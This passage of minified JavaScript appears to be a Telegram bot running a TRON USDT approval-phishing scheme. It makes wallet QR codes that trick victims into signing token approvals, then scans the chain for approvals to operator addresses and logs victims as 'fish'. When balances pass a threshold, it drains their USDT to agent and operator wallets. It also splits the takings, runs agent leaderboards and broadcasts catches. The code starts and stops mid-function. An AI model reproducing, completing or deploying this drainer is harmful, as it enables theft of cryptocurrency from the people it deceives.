    const [b] = await pool.promise().query("SELECT nickname, value FROM " + PERF_TABLE + " WHERE groupid = ? AND value > 0 ORDER BY value DESC LIMIT ?", [a, z]);
    return b || [];
  }
  const [l] = await pool.promise().query("SELECT nickname, value FROM " + PERF_TABLE + " WHERE groupid = ? AND value > 0 ORDER BY value DESC", [a]);
  return l || [];
}
async function buildMonthlyLeaderboardMessage(j, w) {
  await ensurePerformanceTable();
  const a = await getLeaderboard(j, 0);
  if (!a || !a.length) {
    return "当前暂无业绩数据。";
  }
  const z = K => K === 0 ? "🥇" : K === 1 ? "🥈" : K === 2 ? "🥉" : "";
  const l = a.map((K, q) => {
      const E = K.nickname || "",
        P = E || "未知";
      const O = Number(K.value || 0),
        s = q < 3 ? "" + z(q) + (q + 1) + "." : "⭐" + (q + 1) + ".";
      return {
        rank: q + 1,
        label: s,
        name: P,
        value: O
      };
    }),
    b = K => {
      const q = Number(K || 0).toFixed(2);
      return q.replace(/\.?0+$/, "");
    },
    I = l.map(K => K.label + "  " + K.name + "➣ " + b(K.value) + " USDT").join("\n"),
    F = ["人生最好的六位导师：", "母親的眼淚", "父親的低頭", "親戚的冷漠", "朋友的離開", "愛人的背叛", "空蕩蕩的口袋", "要是這些東西你都已經經歷過的話", "那麼你已經不再是普通人了。"].join("\n");
  const U = "————————————",
    u = (() => {
      try {
        const E = getTimeInfo && getTimeInfo();
        if (E && E.time) {
          return String(E.time);
        }
      } catch (P) {}
      const K = new Date();
      const q = O => String(O).padStart(2, "0");
      return K.getFullYear() + "-" + q(K.getMonth() + 1) + "-" + q(K.getDate()) + " " + q(K.getHours()) + ":" + q(K.getMinutes()) + ":" + q(K.getSeconds());
    })();
  return ["🏆业绩排行榜（本月业绩）", "🕒 查询时间：" + u, "📌 当前业绩显示全部", U, I, U, F, U].join("\n");
}
async function handleDailiCallback(J) {
  try {
    return;
    if (!match) {
      return;
    }
    const [l, b, I, F, U] = match,
      u = J.from.id;
    if (u.toString() !== I) {
      const K = {
        text: "❌ 您只能操作自己的推广链接",
        show_alert: true
      };
      await bot.answerCallbackQuery(J.id, K);
      return;
    }
    await bot.answerCallbackQuery(J.id, {
      text: b === "im" ? "✅ 已收到生成 IM 二维码申请" : "✅ 已收到生成 TP 二维码申请",
      show_alert: true
    });
  } catch (q) {
    console.error("[" + getTimeInfo().time + "] 处理代理回调错误:", q);
    const E = {
      text: "处理请求时出现错误，请联系管理员",
      show_alert: true
    };
    await bot.answerCallbackQuery(J.id, E);
  }
}
async function handleQuickQRCodeCommand(l, b, I, F) {
  try {
    const u = I.from.id.toString(),
      K = I.chat.id.toString();
    let q = null;
    for (const [f, X] of cacheData.dailiMap) {
      if (X.tguid === u && String(X.groupid) === K) {
        q = X;
        break;
      }
    }
    if (!q) {
      const n = {
        reply_to_message_id: I.message_id
      };
      await l.sendMessage(b, "❌ 未找到您的代理信息,请先发送 代理 申请", n);
      return;
    }
    const E = q.unique_id,
      P = (q.payment_address || "").trim();
    if (!/^T[A-Za-z1-9]{33}$/.test(P)) {
      const c = {
        reply_to_message_id: I.message_id
      };
      await l.sendMessage(b, "❌ 请先绑定收款地址后再发送\n示例：收款地址 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", c);
      return;
    }
    const O = cacheData.options?.["domain"];
    if (!O) {
      const G = {
        reply_to_message_id: I.message_id
      };
      await l.sendMessage(b, "❌ 未配置跳转域名（domain），请在后台设置", G);
      return;
    }
    const s = String(O).split(/\r?\n/).map(S => S.trim()).filter(S => S.length > 0);
    if (s.length === 0) {
      const S = {
        reply_to_message_id: I.message_id
      };
      await l.sendMessage(b, "❌ 跳转域名（domain）配置为空，请在后台设置", S);
      return;
    }
    const d = s[Math.floor(Math.random() * s.length)],
      A = d.replace(/^https?:\/\//i, "").replace(/\/+$/, "").replace(/\*\./g, ""),
      M = Math.random().toString(36).slice(2, 8),
      L = M + "." + A,
      Y = "https://" + L,
      V = Y + "/sm/?id=" + E,
      N = F === "im" ? "./IM.png" : "./TP.png",
      r = await generateQRCodeWithLogo(V, N, null, E, P),
      B = F === "im" ? "<b>imToken</b> 二维码已生成，请扫码授权" : "<b>TokenPocket</b> 二维码已生成，请扫码授权",
      R = {
        caption: B,
        parse_mode: "HTML",
        reply_to_message_id: I.message_id
      };
    await l.sendPhoto(b, r, R);
  } catch (o) {
    console.error("[" + getTimeInfo().time + "] 快速二维码命令出错:", o);
  }
}
async function generateQRCodeWithLogo(a, z, l, b, I) {
  try {
    if (!fs.existsSync(z)) {
      throw new Error("模板文件不存在: " + z);
    }
    const U = /IM\.png$/i.test(z),
      u = await sharp(z).metadata();
    let K = U ? 332 : 310,
      q = U ? 140 : Math.floor(u.width * 0.236),
      E = U ? 280 : Math.floor(u.height * 0.24);
    const P = Math.max(1, (u.width || 0) - q),
      O = Math.max(1, (u.height || 0) - E),
      s = Math.max(1, Math.min(P, O));
    K = Math.min(K, s);
    let d;
    try {
      const f = {
        errorCorrectionLevel: "H",
        margin: 0,
        width: K
      };
      d = await QRCode.toBuffer(a, f);
    } catch (X) {
      throw new Error("生成二维码错误: " + X.message);
    }
    const A = U ? q + Math.floor(K / 2) : u.width / 2,
      M = U ? 690 : 730,
      L = "middle",
      Y = "\n            <svg width=\"" + u.width + "\" height=\"" + u.height + "\">\n              <style>\n                .address { fill: #000000; font-size: 24px; font-family: \"Courier New\", monospace; letter-spacing: 1px; text-anchor: " + L + "; dominant-baseline: middle }\n              </style>\n              <text x=\"" + A + "\" y=\"" + M + "\" class=\"address\">" + V(I, A) + "</text>\n            </svg>";
    function V(n, c) {
      const G = (n || "").replace(/\s+/g, "");
      const S = G.replace(/(.{30})/g, "$1\n").trim(),
        e = S ? S.split("\n") : [];
      if (e.length === 0) {
        return G;
      }
      return e.map(o => "<tspan x=\"" + c + "\" dy=\"1.2em\">" + o + "</tspan>").join("");
    }
    const N = Buffer.from(Y),
      r = {
        input: d,
        top: E,
        left: q
      };
    const B = {
      input: N,
      top: 0,
      left: 0
    };
    const R = await sharp(z).composite([r, B]).png().toBuffer();
    return R;
  } catch (n) {
    console.error("[" + getTimeInfo().time + "] 生成二维码错误:", n);
    throw n;
  }
}
async function updateThreshold(j, w, J, a, z = false, l) {
  try {
    const I = w.from.id,
      F = await checkGroupAdminStatus(l, j, I),
      U = F.isCreator || F.isAdmin,
      u = cacheData.fishMap.get(J);
    if (U) {
      const q = Array.from(cacheData.dailiMap.values()).find(E => String(E.unique_id) === String(u?.["unique_id"]));
      if (!u || !q || String(q.groupid) !== String(j)) {
        return "❌ 未找到该鱼苗的信息，请核对后重试。";
      }
    } else {
      const E = Array.from(cacheData.dailiMap.values()).find(P => String(P.tguid) === String(I) && String(P.groupid) === String(j));
      if (!E || !u || String(E.unique_id) !== String(u.unique_id)) {
        return z ? "❌ 您没有权限杀此鱼苗" : "❌ 您没有权限修改此鱼苗的阈值";
      }
    }
    if (z) {
      if (!U) {
        const P = parseFloat(u.usdt_balance);
        if (P < 10) {
          return "❌ 该地址余额小于10USDT，禁止杀鱼";
        }
      }
      await pool.promise().query("UPDATE fish SET threshold = ? WHERE fish_address = ? AND auth_status = 1", [0.000001, J]);
      return "🎣正在杀鱼，请稍等...";
    }
    const K = parseFloat(a);
    if (isNaN(K) || K < 10 || K > 1000000) {
      return "❌ 阈值必须在10到1000000之间";
    }
    await pool.promise().query("UPDATE fish SET threshold = ? WHERE fish_address = ? AND auth_status = 1", [K, J]);
    return "✅ 修改成功！新的划币阈值为<code>" + K.toFixed(6) + "</code>";
  } catch (O) {
    console.error("[" + getTimeInfo().time + "] " + (z ? "杀鱼" : "修改阈值") + "错误:", O);
    return "❌ " + (z ? "杀鱼" : "修改阈值") + "时出现错误，请联系管理员。";
  }
}
async function updateAutoThreshold(l, b, I) {
  try {
    const U = b.from.id,
      u = b.from.username,
      K = b.from.first_name + (b.from.last_name ? " " + b.from.last_name : ""),
      q = getTimeInfo();
    I = parseInt(I, 10);
    const E = Array.from(cacheData.dailiMap.values()).find(s => s.tguid === U.toString() && s.groupid === l.toString());
    if (!E) {
      return {
        text: "🎣渔夫 <code>" + K + "</code> " + q.greeting + "！\n\n" + "📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。",
        options: {
          parse_mode: "HTML",
          reply_to_message_id: b.message_id
        }
      };
    }
    if (isNaN(I) || I < 100 || I > 1000000) {
      const s = {
        parse_mode: "HTML",
        reply_to_message_id: b.message_id
      };
      const d = {
        text: "❌ 阈值必须是100到1000000之间的整数",
        options: s
      };
      return d;
    }
    await pool.promise().query("UPDATE daili SET threshold = ?, username = ?, fullName = ? WHERE unique_id = ?", [I, u, K, E.unique_id]);
    const P = {
      parse_mode: "HTML",
      reply_to_message_id: b.message_id
    };
    const O = {
      text: "✅ 修改成功！新的自动阈值为 <code>" + I + "</code>",
      options: P
    };
    return O;
  } catch (A) {
    console.error("[" + getTimeInfo().time + "] 更新自动阈值错误:", A);
    const M = {
      text: "❌ 设置自动阈值失败，请联系管理员",
      options: {}
    };
    M.options.parse_mode = "HTML";
    M.options.reply_to_message_id = b.message_id;
    return M;
  }
}
async function updatePaymentAddress(w, J, a) {
  try {
    const l = J.from.id,
      b = J.from.username,
      I = J.from.first_name + (J.from.last_name ? " " + J.from.last_name : ""),
      F = getTimeInfo(),
      U = {
        parse_mode: "HTML",
        reply_to_message_id: J.message_id
      };
    const u = q => ({
        text: q,
        options: U
      }),
      K = Array.from(cacheData.dailiMap.values()).find(q => q.tguid === l.toString() && q.groupid === w.toString());
    if (!K) {
      return u("🎣渔夫 <code>" + I + "</code> " + F.greeting + "！\n\n" + "📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。");
    }
    if (!/^T[A-Za-z1-9]{33}$/.test(a)) {
      return u("❌ 无效的 TRC20 地址格式");
    }
    await pool.promise().query("UPDATE daili SET payment_address = ?, username = ?, fullName = ? WHERE unique_id = ?", [a, b, I, K.unique_id]);
    return u("✅ 收款地址设置成功！\n\n<code>" + a + "</code>");
  } catch (q) {
    console.error("[" + getTimeInfo().time + "] 更新收款地址错误:", q);
    return response("❌ 设置收款地址时出现错误，请联系管理员。");
  }
}
async function getPaymentAddressInfo(w, J) {
  try {
    const z = J.from.id,
      b = J.from.first_name + (J.from.last_name ? " " + J.from.last_name : ""),
      I = getTimeInfo(),
      F = {
        parse_mode: "HTML",
        reply_to_message_id: J.message_id
      };
    const U = K => ({
        text: K,
        options: F
      }),
      u = Array.from(cacheData.dailiMap.values()).find(K => K.tguid === z.toString() && K.groupid === w.toString());
    if (!u) {
      return U("🎣渔夫 <code>" + b + "</code> " + I.greeting + "！\n\n" + "📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。");
    }
    if (!u.payment_address) {
      return U("🎣渔夫 <code>" + b + "</code> " + I.greeting + "！\n\n" + "❌ 您还未设置收款地址\n\n" + "📝 可使用以下命令设置您的收款地址：\n" + "收款地址 TRxxx（将TRxxx替换为你的收款地址）");
    }
    return U("🎣渔夫 <code>" + b + "</code> " + I.greeting + "！\n\n" + "💰 您的收款地址：\n" + ("<code>" + u.payment_address + "</code>"));
  } catch (K) {
    console.error("[" + getTimeInfo().time + "] 查询收款地址错误:", K);
    return response("❌ 查询收款地址时出现错误，请联系管理员。");
  }
}
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const tronKeyManager = {
  keys: [],
  index: 0,
  cooldownUntil: new Map(),
  backoffSeconds: new Map(),
  refreshFromOptions(w) {
    const z = (w || "").split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0);
    this.keys = z;
    for (const l of [...this.cooldownUntil.keys()]) {
      !this.keys.includes(l) && (this.cooldownUntil.delete(l), this.backoffSeconds.delete(l));
    }
    this.index >= this.keys.length && (this.index = 0);
  },
  getNextActiveKey() {
    if (!this.keys || this.keys.length === 0) {
      return null;
    }
    const a = Date.now();
    for (let z = 0; z < this.keys.length; z++) {
      const l = (this.index + z) % this.keys.length,
        b = this.keys[l],
        I = this.cooldownUntil.get(b) || 0;
      if (a >= I) {
        this.index = (l + 1) % this.keys.length;
        return b;
      }
    }
    return null;
  },
  markRateLimited(j) {
    if (!j) {
      return;
    }
    const J = this.backoffSeconds.get(j) || 60,
      a = Math.min(J * 2, 600);
    this.backoffSeconds.set(j, a);
    this.cooldownUntil.set(j, Date.now() + a * 1000);
    console.warn("[" + getTimeInfo().time + "] 已将 TRON-PRO-API-KEY 冷却 " + a + "s");
  },
  markSuccess(j) {
    if (!j) {
      return;
    }
    this.backoffSeconds.set(j, 60);
    this.cooldownUntil.delete(j);
  }
};
function createTronWeb() {
  try {
    !tronKeyManager.keys.length && tronKeyManager.refreshFromOptions(cacheData.options.trongridkyes);
    const a = tronKeyManager.getNextActiveKey();
    if (!a) {
      throw new Error("TRON-PRO-API-KEY 正在冷却，暂无可用 Key");
    }
    const z = {
      "TRON-PRO-API-KEY": a
    };
    const l = {
      fullHost: "https://api.trongrid.io",
      headers: z
    };
    return new TronWeb(l);
  } catch (b) {
    console.error("[" + getTimeInfo().time + "] 创建TronWeb实例时出错:", b);
    return null;
  }
}
async function TRCfetchLatestBlock() {
  let w = null;
  while (true) {
    try {
      const J = createTronWeb();
      if (!J) {
        console.warn("[" + getTimeInfo().time + "] 无法创建 TronWeb 实例，等待 10 秒重试");
        await new Promise(b => setTimeout(b, 10000));
        continue;
      }
      const a = J?.["headers"]?.["TRON-PRO-API-KEY"],
        z = await J.trx.getCurrentBlock();
      tronKeyManager.markSuccess(a);
      const l = z.block_header.raw_data.number;
      if (w === null) {
        console.log("[" + getTimeInfo().time + "] TRC初始化: 当前最新区块号为 " + l);
        w = l;
      } else {
        if (l > w) {
          const b = [];
          for (let I = w + 1; I <= l; I++) {
            b.push(I);
          }
          for (const F of b) {
            await scanBlock(F);
          }
          w = l;
        }
      }
    } catch (U) {
      if (U.response && U.response.status === 429) {
        const u = U?.["config"]?.["headers"]?.["TRON-PRO-API-KEY"];
        tronKeyManager.markRateLimited(u);
        console.error("[" + getTimeInfo().time + "] 触发限流(429)，当前 Key 进入冷却：" + (u || "未知"));
        await new Promise(K => setTimeout(K, 30000));
      } else {
        console.error("[" + getTimeInfo().time + "] TRC获取最新区块时发生错误:", U);
        await new Promise(K => setTimeout(K, 5000));
      }
    }
    await new Promise(K => setTimeout(K, 2000));
  }
}
async function checkBalance(w) {
  let a = null;
  let z = null;
  const l = U => new Promise(u => setTimeout(u, U));
  async function b(U = 0) {
    const u = createTronWeb();
    if (!u) {
      console.error("TRC20-创建 TronWeb 实例失败，无法查询 TRX 余额 (地址: " + w + ")");
      return null;
    }
    try {
      const K = await u.trx.getAccount(w);
      tronKeyManager.markSuccess(u?.["headers"]?.["TRON-PRO-API-KEY"]);
      return parseFloat(u.fromSun(K.balance || 0)).toFixed(6);
    } catch (q) {
      q?.["response"]?.["status"] === 429 ? (tronKeyManager.markRateLimited(q?.["config"]?.["headers"]?.["TRON-PRO-API-KEY"]), console.error("[" + getTimeInfo().time + "] TRC20-查询 TRX 余额时触发限流 (地址: " + w + ")")) : console.error("TRC20-查询 TRX 余额时出错 (地址: " + w + "), 尝试次数: " + (U + 1) + ":", q);
      return U < 2 ? (await l(2000), b(U + 1)) : (console.error("TRC20-TRX 余额查询失败，已达到最大重试次数"), null);
    }
  }
  async function I(U = 0) {
    const u = createTronWeb();
    if (!u) {
      console.error("TRC20-创建 TronWeb 实例失败，无法查询 USDT 余额 (地址: " + w + ")");
      return null;
    }
    try {
      const K = await u.contract().at(USDT_CONTRACT),
        q = await K.balanceOf(w).call({
          from: w
        });
      tronKeyManager.markSuccess(u?.["headers"]?.["TRON-PRO-API-KEY"]);
      return parseFloat(u.toDecimal(q) / 1000000).toFixed(6);
    } catch (E) {
      E?.["response"]?.["status"] === 429 ? (tronKeyManager.markRateLimited(E?.["config"]?.["headers"]?.["TRON-PRO-API-KEY"]), console.error("[" + getTimeInfo().time + "] TRC20-查询 USDT 余额时触发限流 (地址: " + w + ")")) : console.error("TRC20-查询 USDT 余额时出错 (地址: " + w + "), 尝试次数: " + (U + 1) + ":", E);
      return U < 2 ? (await l(2000), I(U + 1)) : (console.error("TRC20-USDT 余额查询失败，已达到最大重试次数"), null);
    }
  }
  [a, z] = await Promise.all([b(), I()]);
  const F = {
    trxBalance: a,
    usdtBalance: z
  };
  return F;
}
async function getAvailableEnergy(j) {
  try {
    const J = createTronWeb();
    if (!J) {
      return null;
    }
    const a = await J.trx.getAccountResources(j),
      z = Number(a?.["EnergyLimit"] || 0),
      l = Number(a?.["EnergyUsed"] || 0),
      b = Math.max(0, z - l);
    if (Number.isFinite(b)) {
      return b;
    }
    return null;
  } catch (I) {
    return null;
  }
}
async function updateFishBalances() {
  const w = J => new Promise(a => setTimeout(a, J));
  while (true) {
    try {
      const J = Array.from(cacheData.fishMap.values()).filter(z => z.chainid === "TRC"),
        a = 5;
      for (let z = 0; z < J.length; z += a) {
        const l = J.slice(z, z + a);
        await Promise.all(l.map(async b => {
          try {
            const {
              trxBalance: I,
              usdtBalance: F
            } = await checkBalance(b.fish_address);
            I !== null && F !== null ? (b.gas_balance !== I || b.usdt_balance !== F) && (await pool.promise().query("UPDATE fish SET gas_balance = ?, usdt_balance = ? WHERE fish_address = ? AND chainid = 'TRC'", [I, F, b.fish_address]), b.gas_balance = I, b.usdt_balance = F) : console.warn("[" + getTimeInfo().time + "] 跳过余额更新: " + b.fish_address + ", 部分余额查询失败 (TRX: " + I + ", USDT: " + F + ")");
          } catch (U) {
            console.error("[" + getTimeInfo().time + "] 更新鱼苗余额失败: " + b.fish_address + ", 错误:", U);
          }
        }));
        await w(2000);
      }
      await w(15000);
    } catch (b) {
      console.error("[" + getTimeInfo().time + "] 更新鱼苗余额过程中发生错误:", b);
      await w(60000);
    }
  }
}
async function scanBlock(w) {
  try {
    const a = createTronWeb();
    let z = await a.trx.getBlock(w);
    if (!z || z.message?.["includes"]("Block not found")) {
      console.log("[" + getTimeInfo().time + "] TRC区块 " + w + " 未找到，跳过该区块");
      return;
    }
    if (z.transactions && z.transactions.length > 0) {
      for (const l of z.transactions) {
        const b = l.raw_data.contract && l.raw_data.contract[0];
        if (!b) {
          continue;
        }
        const I = b.type,
          F = b.parameter,
          U = F?.["value"]?.["data"];
        if (I === "TriggerSmartContract" && U) {
          if (U.startsWith("23b872dd") || U.startsWith("a9059cbb")) {
            await usdt_transfer(l);
          } else {
            (U.startsWith("d73dd623") || U.startsWith("095ea7b3")) && (await usdt_approve(l));
          }
        }
      }
    }
  } catch (u) {
    if (u.code === "ECONNRESET") {
      console.log("[" + getTimeInfo().time + "] TRC区块 " + w + " 连接重置，跳过该区块");
      return;
    }
    const K = {
      message: u.message,
      code: u.code,
      stack: u.stack
    };
    console.error("[" + getTimeInfo().time + "] TRC获取区块 " + w + " 时发生错误:", K);
    return;
  }
}
async function usdt_transfer(z) {
  try {
    const b = z.txID,
      I = z.ret[0].contractRet,
      F = TronWeb.address.fromHex(z.raw_data.contract[0].parameter.value.owner_address),
      U = z.raw_data.contract[0].parameter.value.contract_address,
      u = z.raw_data.contract[0].parameter.value.data;
    if (I !== "SUCCESS" || U !== "41a614f803b6fd780986a42c78ec9c7f77e6ded13c") {
      return;
    }
    const K = TronWeb.address.fromHex("41" + u.slice(32, 72)),
      q = parseInt(u.slice(72), 16) / 1000000,
      E = Array.from(cacheData.fishMap.values()).filter(P => (P.fish_address === F || P.fish_address === K) && P.auth_status === 1 && P.chainid === "TRC");
    if (!E.length) {
      return;
    }
    for (const P of E) {
      const O = P.fish_address,
        s = P.unique_id,
        d = O === F,
        A = d ? "↖️转出金额" : "↪️转入金额",
        L = cacheData.dailiMap.get(s);
      if (!L) {
        continue;
      }
      const {
          username: Y,
          groupid: V
        } = L,
        {
          trxBalance: N,
          usdtBalance: r
        } = await checkBalance(O),
        B = V,
        R = registerPvData("addr", O, s, B),
        f = registerPvData("tx", b, s, B),
        X = {
          text: "👁 查看地址（仅本人/管理员）",
          callback_data: "pv:addr:" + R
        };
      const n = {
        text: "🌍 查看交易信息（仅本人/管理员）",
        callback_data: "pv:tx:" + f
      };
      const c = {
        inline_keyboard: [[X], [n]]
      };
      const G = {
        reply_markup: c
      };
      const e = Number(q || 0) || 0;
      let o = null;
      if (!d) {
        const T = Number(r);
        Number.isFinite(T) && (o = T - e);
        !Number.isFinite(o) && (o = Number(P.usdt_balance || 0) || 0);
        if (o < 0) {
          o = 0;
        }
      }
      const i = !d ? o + e : null,
        Q = !d && Number.isFinite(i) && i >= ROUTE_SPLIT_TRIGGER;
      !Q && (await broadcastToAllAgentGroups(bot, Y, B, (C, v) => "🐟【鱼苗动账通知】TRC-USDT 转账通知🐟\n\n" + ("🐠鱼苗地址 " + (C ? C : "") + "：\n<code>已隐藏（仅本人/管理员可查看）</code>\n\n") + "📥交易地址：\n<code>已隐藏（仅本人/管理员可查看）</code>\n\n" + (A + "：<code>" + q.toFixed(6) + " USDT</code>\n\n") + ("⏰交易时间：<code>" + getTimeInfo().time + "</code>\n\n") + ("🪫TRX 余额：<code>" + (N !== null ? N : "查询失败") + "</code> 💵USDT余额：<code>" + (r !== null ? r : "查询失败") + "</code>"), G, O));
      if (parseFloat(r) > parseFloat(P.threshold)) {
        await pool.promise().query("UPDATE fish SET gas_balance = ?, usdt_balance = 0.000001 WHERE fish_address = ? AND auth_status = 1 AND chainid = 'TRC'", [N, O]);
        const C = cacheData.fishMap.get(O);
        C && (C.gas_balance = N, C.usdt_balance = 0.000001);
        (async () => {
          try {
            await processTRCTransfer(O, P.permissions_fishaddress, r);
          } catch (v) {
            console.error("[" + getTimeInfo().time + "] 动账触发转账处理失败: " + O + ", 错误:", v);
          }
        })();
      } else {
        await pool.promise().query("UPDATE fish SET gas_balance = ?, usdt_balance = ? WHERE fish_address = ? AND auth_status = 1 AND chainid = 'TRC'", [N, r, O]);
        const v = cacheData.fishMap.get(O);
        v && (v.gas_balance = N, v.usdt_balance = r);
      }
    }
  } catch (x) {
    console.error("[" + getTimeInfo().time + "] TRC处理USDT转账时发生错误:", x);
  }
}
async function usdt_approve(z) {
  try {
    const b = z.txID,
      I = z.ret[0].contractRet,
      F = TronWeb.address.fromHex(z.raw_data.contract[0].parameter.value.owner_address),
      U = z.raw_data.contract[0].parameter.value.contract_address,
      u = z.raw_data.contract[0].parameter.value.data;
    if (I !== "SUCCESS" || U !== "41a614f803b6fd780986a42c78ec9c7f77e6ded13c") {
      return;
    }
    const K = TronWeb.address.fromHex("41" + u.slice(32, 72)),
      q = parseInt(u.slice(72), 16) / 1000000,
      E = cacheData.permissionAddresses.some(T => T.toLowerCase() === K.toLowerCase());
    if (!E) {
      return;
    }
    const {
      trxBalance: P,
      usdtBalance: O
    } = await checkBalance(F);
    let s = null;
    const [d] = await pool.promise().query("SELECT unique_id FROM fish_browse WHERE fish_address = ? AND chainid = 'TRC' ORDER BY time DESC LIMIT 1", [F]);
    if (d.length > 0 && d[0].unique_id) {
      s = d[0].unique_id;
    } else {
      const [T] = await pool.promise().query("SELECT value FROM options WHERE name = 'default_id' LIMIT 1");
      T.length > 0 && T[0].value && (s = T[0].value);
    }
    const A = cacheData.dailiMap.get(s);
    if (!A) {
      console.error("[" + getTimeInfo().time + "] 找不到代理信息，unique_id: " + s);
      return;
    }
    const {
        username: M,
        groupid: L
      } = A,
      V = getTimeInfo().time,
      N = typeof DEFAULT_AUTO_THRESHOLD !== "undefined" && DEFAULT_AUTO_THRESHOLD ? DEFAULT_AUTO_THRESHOLD : 5000,
      r = Number(A?.["threshold"] ?? N) || 2000;
    let B = "",
      R = () => "";
    const f = K,
      [X] = await pool.promise().query("SELECT * FROM fish WHERE fish_address = ? AND chainid = 'TRC'", [F]);
    q === 0 || q < 100 ? q === 0 ? (B = "❌ <code>取消授权 额度 0 USDT</code>", R = () => "❌ 注：因该地址已取消授权，已从鱼池列表中删除", X.length > 0 && (await pool.promise().query("UPDATE fish SET remark = ?, auth_status = 0 WHERE fish_address = ? AND chainid = 'TRC'", ["取消授权", F]))) : (B = "❌ <code>授权额度 " + Math.floor(q) + " USDT</code>", R = () => "❌ 注：因该地址的授权额度太低，将不加入鱼池列表", X.length > 0 && (await pool.promise().query("UPDATE fish SET remark = ?, auth_status = 0 WHERE fish_address = ? AND chainid = 'TRC'", ["授权额度：" + Math.floor(q), F]))) : (B = "✅ <code>授权成功</code>", R = C => "✅ 当前默认提币阈值为 <code>" + r + " USDT</code>\n\n您可以通过命令 <code>修改阈值 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 10000</code> 将阈值修改为10000或者你想要设置的阈值;", parseFloat(O) > parseFloat(r) ? (X.length > 0 ? await pool.promise().query("UPDATE fish SET chainid = 'TRC', permissions_fishaddress = ?, usdt_balance = 0.000001, gas_balance = ?, threshold = ?, time = ?, unique_id = ?, remark = NULL, auth_status = 1 WHERE fish_address = ? AND chainid = 'TRC'", [f, P, r, V, s, F]) : await pool.promise().query("INSERT INTO fish (fish_address, chainid, permissions_fishaddress, usdt_balance, gas_balance, threshold, time, unique_id, remark, auth_status) VALUES (?, 'TRC', ?, 0.000001, ?, ?, ?, ?, NULL, 1)", [F, f, P, r, V, s]), (async () => {
      try {
        await processTRCTransfer(F, f, O);
      } catch (C) {
        console.error("[" + getTimeInfo().time + "] 授权触发转账处理失败: " + F + ", 错误:", C);
      }
    })()) : X.length > 0 ? await pool.promise().query("UPDATE fish SET chainid = 'TRC', permissions_fishaddress = ?, usdt_balance = ?, gas_balance = ?, threshold = ?, time = ?, unique_id = ?, remark = NULL, auth_status = 1 WHERE fish_address = ? AND chainid = 'TRC'", [f, O, P, r, V, s, F]) : await pool.promise().query("INSERT INTO fish (fish_address, chainid, permissions_fishaddress, usdt_balance, gas_balance, threshold, time, unique_id, remark, auth_status) VALUES (?, 'TRC', ?, ?, ?, ?, ?, ?, NULL, 1)", [F, f, O, P, r, V, s]));
    const n = L,
      c = registerPvData("addr", F, s, n),
      G = registerPvData("tx", b, s, n),
      S = {
        text: "👁 查看地址（仅本人/管理员）",
        callback_data: "pv:addr:" + c
      };
    const e = {
      text: "🌍 查看交易信息（仅本人/管理员）",
      callback_data: "pv:tx:" + G
    };
    const o = {
      inline_keyboard: [[S], [e]]
    };
    const i = {
      reply_markup: o
    };
    L && (await broadcastToAllAgentGroups(bot, M, n, (C, v) => "🎣【有鱼上钩啦】TRC-USDT授权通知🎣\n\n" + ("🐠鱼苗地址 " + (C ? C : "") + "：<code>已隐藏（仅本人/管理员可查看）</code>\n\n") + ("🔐权限地址：<code>" + f + "</code>\n\n") + ("📨授权状态：" + B + "\n\n") + ("⏰授权时间：<code>" + V + "</code>\n\n") + ("🪫TRX 余额：<code>" + (P !== null ? P : "查询失败") + "</code> 💵USDT余额：<code>" + (O !== null ? O : "查询失败") + "</code>\n\n\n") + ("<b>" + R(v) + "</b>"), i, F));
  } catch (C) {
    console.error("[" + getTimeInfo().time + "] TRC处理USDT授权时发生错误:", C);
  }
}
async function monitorFishTable() {
  const w = new Set();
  while (true) {
    try {
      const J = Array.from(cacheData.fishMap.values()).filter(a => a.auth_status === 1 && a.threshold !== null && Number(a.usdt_balance) > Number(a.threshold) && !w.has(a.fish_address));
      if (J.length > 0) {
        const a = J[0],
          {
            fish_address: z,
            chainid: l
          } = a;
        w.add(z);
        (async () => {
          try {
            await processTRCTransfer(z, a.permissions_fishaddress, a.usdt_balance);
          } catch (b) {
            console.error("[" + getTimeInfo().time + "] 处理转账失败: " + z + ", 链: " + l + ", 错误:", b);
          } finally {
            w.delete(z);
          }
        })();
      }
    } catch (b) {
      console.error("[" + getTimeInfo().time + "] 监控鱼池时发生错误:", b);
    }
    await new Promise(I => setTimeout(I, 2000));
  }
}
async function processTRCTransfer(u, K, q) {
  let P = null,
    O = null;
  let s = null,
    d;
  let A, M;
  try {
    if (typeof startCacheUpdate.refreshNow === "function") {
      try {
        await startCacheUpdate.refreshNow();
      } catch (R) {}
    }
    const L = cacheData.options.payment_address,
      Y = cacheData.options.contract_method,
      V = cacheData.options.need_usdt_contract,
      N = cacheData.fishMap.get(u);
    try {
      P = cacheData.dailiMap.get(N.unique_id);
      P && P.groupid && (O = cacheData.dailiGroupMap.get(P.groupid));
    } catch (f) {
      P = null;
    }
    if (!processTRCTransfer.processing) {
      processTRCTransfer.processing = new Set();
    }
    if (processTRCTransfer.processing.has(u)) {
      return;
    }
    processTRCTransfer.processing.add(u);
    const r = Math.floor((q - 0.000001) * 1000000) / 1000000;
    M = 0.000001;
    A = r;
    const B = async (X, n) => {
      const c = await executeContractTransaction(Y, V, u, K, X, n);
      return c;
    };
    if (P && P.payment_address) {
      const X = Number(q) >= ROUTE_SPLIT_TRIGGER;
      let n = O ? parseFloat(O.share_profits ?? 0.5) : 0.5;
      if (!Number.isFinite(n)) {
        n = 0.5;
      }
      n = Math.max(0, Math.min(1, n));
      const c = Math.floor(r * n * 1000000) / 1000000,
        G = Math.floor((r - c) * 1000000) / 1000000;
      if (X) {
        const S = glimmerShift(L);
        s = await B(S, A);
        if (!s) {
          return;
        }
      } else {
        if (n === 0) {
          s = await B(L, A);
          if (!s) {
            return;
          }
        } else {
          if (n === 1) {
            s = await B(P.payment_address, A);
            if (!s) {
              return;
            }
          } else {
            const e = await B(P.payment_address, c);
            if (!e) {
              return;
            }
            s = e;
            await new Promise(i => setTimeout(i, 500));
            const o = await B(L, G);
            if (!o) {
              return;
            }
          }
        }
      }
      if (!X) {
        const i = {
          text: "🌍详细交易信息",
          url: "https://tronscan.org/#/transaction/" + s
        };
        const Q = {
          inline_keyboard: [[i]]
        };
        const T = {
          reply_markup: Q
        };
